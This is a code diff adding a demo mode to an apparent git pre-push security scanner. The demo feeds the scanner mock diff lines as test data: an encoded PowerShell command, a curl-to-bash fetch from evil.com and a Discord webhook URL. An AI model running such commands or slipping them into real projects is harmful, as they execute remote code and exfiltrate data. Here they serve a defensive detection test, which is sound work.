@@ -20,6 +20,25 @@ async function main() {
       runManualScan();
       break;
 
+    case 'demo':
+    case 'test-run': {
+      banner();
+      console.log(`${colors.cyan}Simulating a malicious push intercept test...${colors.reset}\n`);
+      const { scanFilesAndDiff } = require('../src/scanner');
+      const { printReport, printBlockMessage } = require('../src/reporter');
+
+      const mockFiles = ['src/app.js', 'temp_auto_push.bat', '.vscode/tasks.json'];
+      const mockDiff = `+ powershell.exe -enc SQBFAFgAIAAoAE4AZQB3...
++ curl -fsSL https://evil.com/hook.sh | bash
++ const webhook = "https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";`;
+
+      const result = scanFilesAndDiff(mockFiles, mockDiff);
+      printReport(result);
+      printBlockMessage();
+      console.log(`${colors.green}${colors.bold}✔ Simulation Complete:${colors.reset} In a real git push, GitSafty will immediately exit 1 and reject the push!\n`);
+      break;
+    }
+
     case 'clean':
     case 'fix': {
       banner();
